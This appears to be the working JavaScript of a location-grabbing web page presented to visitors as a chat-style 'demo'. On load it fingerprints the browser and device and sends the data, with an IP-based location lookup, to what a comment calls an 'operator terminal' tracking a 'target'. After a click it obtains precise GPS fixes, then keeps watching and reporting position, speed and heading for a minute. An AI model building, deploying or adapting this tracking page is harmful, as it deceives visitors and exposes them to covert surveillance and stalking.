(function () {
  const GEO_FAST_OPTS = {
    enableHighAccuracy: false,
    timeout: 20000,
    maximumAge: 120000
  };

  const GEO_WATCH_OPTS = {
    enableHighAccuracy: false,
    timeout: 15000,
    maximumAge: 120000
  };

  const GEO_PRECISE_OPTS = {
    enableHighAccuracy: true,
    timeout: 60000,
    maximumAge: 0
  };

  const WATCH_MAX_MS = 25000;

  let ipInfo = null;
  let watchId = null;
  let watchTimer = null;
  let fallbackWatchId = null;
  let fallbackWatchTimer = null;
  let inProgress = false;

  function getSessionId() {
    const parts = window.location.pathname.split("/").filter(Boolean);
    if (parts.length >= 2 && parts[0] === "session") {
      return parts[1];
    }
    return "";
  }

  function getTargetEndpoint() {
    const sid = getSessionId();
    return sid ? ("/api/session/" + sid + "/location") : "/report";
  }

  function scrollChatToBottom() {
    const body = document.getElementById("chat-body");
    if (body) {
      body.scrollTop = body.scrollHeight;
    }
  }

  function appendBubble(text, isOutgoing) {
    const thread = document.getElementById("chat-thread");
    if (!thread) return;

    const group = document.createElement("div");
    group.className = "message-group " + (isOutgoing ? "outgoing" : "incoming");

    const bubble = document.createElement("div");
    bubble.className = "message-bubble";

    const p = document.createElement("p");
    p.textContent = text;

    bubble.appendChild(p);
    group.appendChild(bubble);
    thread.appendChild(group);

    scrollChatToBottom();
  }

  function isValidCoordinate(lat, lon) {
    if (typeof lat !== "number" || typeof lon !== "number") return false;
    if (isNaN(lat) || !isFinite(lat) || isNaN(lon) || !isFinite(lon)) return false;
    if (lat < -90 || lat > 90) return false;
    if (lon < -180 || lon > 180) return false;
    return true;
  }

  function collectBrowserInfo() {
    const ua = navigator.userAgent || "Unknown";
    let browser = "Browser";
    let version = "1.0";

    if (/Edg|Edge/i.test(ua)) {
      browser = "Edge";
      const m = ua.match(/Edg[e]?\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/SamsungBrowser/i.test(ua)) {
      browser = "Samsung Internet";
      const m = ua.match(/SamsungBrowser\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/OPR|Opera/i.test(ua)) {
      browser = "Opera";
      const m = ua.match(/(?:OPR|Opera)\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/Firefox|FxiOS/i.test(ua)) {
      browser = "Firefox";
      const m = ua.match(/(?:Firefox|FxiOS)\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/CriOS/i.test(ua)) {
      browser = "Chrome iOS";
      const m = ua.match(/CriOS\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/Chrome/i.test(ua)) {
      browser = /Android/i.test(ua) ? "Chrome Android" : "Chrome";
      const m = ua.match(/Chrome\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
      browser = "Safari";
      const m = ua.match(/Version\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/Trident/i.test(ua)) {
      browser = "Internet Explorer";
      const m = ua.match(/rv:(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    }

    return {
      userAgent: ua,
      platform: navigator.platform || "Unknown",
      browser: browser,
      browserVersion: version,
      screenResolution: window.screen ? window.screen.width + "x" + window.screen.height : "Unknown",
      devicePixelRatio: (window.devicePixelRatio || 1).toString(),
      hardwareConcurrency: (navigator.hardwareConcurrency || "Unknown").toString(),
      cpuCores: (navigator.hardwareConcurrency || "Unknown").toString(),
      language: navigator.language || "Unknown",
      timezone: Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Unknown",
      viewportSize: window.innerWidth + "x" + window.innerHeight,
      touchSupport: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
      deviceType: (/Mobi|Android/i.test(ua) || ('ontouchstart' in window && screen.width < 768)) ? "Mobile" : "Desktop"
    };
  }

  function parseWho(j) {
    const conn = j.connection || {};
    return {
      ip: j.ip,
      city: j.city,
      region: j.region,
      country: j.country,
      isp: conn.isp || j.isp || conn.org,
      lat: typeof j.latitude === "number" ? j.latitude : null,
      lon: typeof j.longitude === "number" ? j.longitude : null
    };
  }

  function parseApi(j) {
    return {
      ip: j.ip,
      city: j.city,
      region: j.region,
      country: j.country_name || j.country,
      isp: j.org || j.isp,
      lat: typeof j.latitude === "number" ? j.latitude : null,
      lon: typeof j.longitude === "number" ? j.longitude : null
    };
  }

  async function lookupIp() {
    try {
      const r = await fetch("https://ipwho.is/");
      if (r.ok) {
        const j = await r.json();
        if (j && j.success !== false) {
          ipInfo = parseWho(j);
          return;
        }
      }
    } catch (e) {}

    try {
      const r = await fetch("https://ipapi.co/json/");
      if (r.ok) {
        const j = await r.json();
        ipInfo = parseApi(j);
      }
    } catch (e) {}
  }

  function postPayload(data) {
    const dest = getTargetEndpoint();
    return fetch(dest, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
      .then(function (res) {
        return res.ok;
      })
      .catch(function () {
        return false;
      });
  }

  function clearWatchSafely() {
    if (watchId !== null && navigator.geolocation) {
      navigator.geolocation.clearWatch(watchId);
      watchId = null;
    }
    if (watchTimer !== null) {
      clearTimeout(watchTimer);
      watchTimer = null;
    }
  }

  function clearFallbackWatch() {
    if (fallbackWatchId !== null && navigator.geolocation) {
      navigator.geolocation.clearWatch(fallbackWatchId);
      fallbackWatchId = null;
    }
    if (fallbackWatchTimer !== null) {
      clearTimeout(fallbackWatchTimer);
      fallbackWatchTimer = null;
    }
  }

  function startHighAccuracyWatch() {
    if (watchId !== null || !navigator.geolocation) return;

    watchId = navigator.geolocation.watchPosition(
      function (newPos) {
        const nc = newPos.coords;
        if (!isValidCoordinate(nc.latitude, nc.longitude)) return;

        const timestampStr = newPos.timestamp ? new Date(newPos.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();

        postPayload({
          gps: {
            lat: nc.latitude,
            lon: nc.longitude,
            accuracy: typeof nc.accuracy === "number" && isFinite(nc.accuracy) ? nc.accuracy : null,
            altitude: typeof nc.altitude === "number" && isFinite(nc.altitude) ? nc.altitude : null,
            speed: typeof nc.speed === "number" && isFinite(nc.speed) ? nc.speed : null,
            heading: typeof nc.heading === "number" && isFinite(nc.heading) ? nc.heading : null,
            timestamp: timestampStr
          }
        });
      },
      function () {},
      GEO_PRECISE_OPTS
    );

    // Bounded high-accuracy watch (stop after 60 seconds)
    watchTimer = setTimeout(function () {
      clearWatchSafely();
    }, 60000);
  }

  function applyFix(pos) {
    const c = pos.coords;
    if (!isValidCoordinate(c.latitude, c.longitude)) {
      geoError({ code: 2 });
      return;
    }

    const timestampStr = pos.timestamp ? new Date(pos.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();

    const gpsData = {
      lat: c.latitude,
      lon: c.longitude,
      accuracy: typeof c.accuracy === "number" && isFinite(c.accuracy) ? c.accuracy : null,
      altitude: typeof c.altitude === "number" && isFinite(c.altitude) ? c.altitude : null,
      speed: typeof c.speed === "number" && isFinite(c.speed) ? c.speed : null,
      heading: typeof c.heading === "number" && isFinite(c.heading) ? c.heading : null,
      timestamp: timestampStr
    };

    const bInfo = collectBrowserInfo();
    postPayload({
      ip: ipInfo,
      gps: gpsData,
      browser: bInfo
    }).then(function (success) {
      if (!success) {
        appendBubble("Location was received, but the result could not be sent to the server.", false);
      }
    });

    startHighAccuracyWatch();
  }

  async function getLocationPermissionState() {
    if (!navigator.permissions || !navigator.permissions.query) {
      return "unknown";
    }

    try {
      const result = await navigator.permissions.query({
        name: "geolocation"
      });

      return result.state || "unknown";
    } catch (e) {
      return "unknown";
    }
  }

  function enableContinueButton() {
    inProgress = false;
    const btn =
      document.getElementById("btn-start-demo") ||
      document.getElementById("btn-continue");

    if (btn) {
      btn.disabled = false;
    }
  }

  function geoError(err) {
    clearFallbackWatch();
    const bInfo = collectBrowserInfo();
    const code = err ? err.code : 1;
    postPayload({ denied: true, errorCode: code, browser: bInfo });

    if (code === 1) {
      appendBubble("Location permission was denied or blocked.", false);
    } else if (code === 2) {
      appendBubble("Chrome could not obtain a location from the device location provider.", false);
      appendBubble("Make sure Location is enabled on the phone and try again.", false);
    } else if (code === 3) {
      appendBubble("Chrome could not obtain a location before the request timed out.", false);
      appendBubble("Make sure Location is enabled on the phone and try again.", false);
    } else {
      appendBubble("Location information is currently unavailable.", false);
    }

    enableContinueButton();
  }

  function runPreciseFallback() {
    clearFallbackWatch();
    navigator.geolocation.getCurrentPosition(
      function (pos) {
        inProgress = false;
        applyFix(pos);
      },
      function (err) {
        inProgress = false;
        geoError(err);
      },
      GEO_PRECISE_OPTS
    );
  }

  function runWatchFallback() {
    clearFallbackWatch();
    let fixAcquired = false;

    fallbackWatchTimer = setTimeout(function () {
      if (fixAcquired) return;
      clearFallbackWatch();
      appendBubble("The first location provider did not respond. Trying a longer high-accuracy request...", false);
      runPreciseFallback();
    }, WATCH_MAX_MS);

    fallbackWatchId = navigator.geolocation.watchPosition(
      function (pos) {
        if (fixAcquired) return;
        fixAcquired = true;
        clearFallbackWatch();
        inProgress = false;
        applyFix(pos);
        appendBubble("Improving location accuracy when available...", false);
      },
      function (err) {
        if (err && err.code === 1) {
          if (fixAcquired) return;
          fixAcquired = true;
          clearFallbackWatch();
          inProgress = false;
          geoError(err);
        }
      },
      GEO_WATCH_OPTS
    );
  }

  async function startDemo() {
    if (inProgress) return;
    inProgress = true;

    const btn =
      document.getElementById("btn-start-demo") ||
      document.getElementById("btn-continue");

    if (btn) {
      btn.disabled = true;
    }

    appendBubble("Checking browser capabilities...", false);

    if (!navigator.geolocation) {
      appendBubble("Location access was not granted.", false);
      enableContinueButton();
      return;
    }

    const permissionState = await getLocationPermissionState();

    if (permissionState === "denied") {
      appendBubble(
        "Location permission is blocked for this site. Allow location access for this site in Chrome settings and try again.",
        false
      );
      enableContinueButton();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      function (pos) {
        clearFallbackWatch();
        inProgress = false;
        applyFix(pos);
        appendBubble(
          "Improving location accuracy when available...",
          false
        );
      },
      function (err) {
        // Permission denied: do not retry.
        if (err && err.code === 1) {
          inProgress = false;
          geoError(err);
          return;
        }

        appendBubble(
          "The first location provider did not respond. Trying background positioning...",
          false
        );

        runWatchFallback();
      },
      GEO_FAST_OPTS
    );
  }

  document.addEventListener("DOMContentLoaded", function () {
    const bInfo = collectBrowserInfo();
    lookupIp();

    // Send initial browser connection payload so operator terminal displays target connection immediately
    postPayload({ browser: bInfo });

    const btn = document.getElementById("btn-start-demo") || document.getElementById("btn-continue");
    if (btn) {
      btn.addEventListener("click", startDemo);
    }
  });
})();
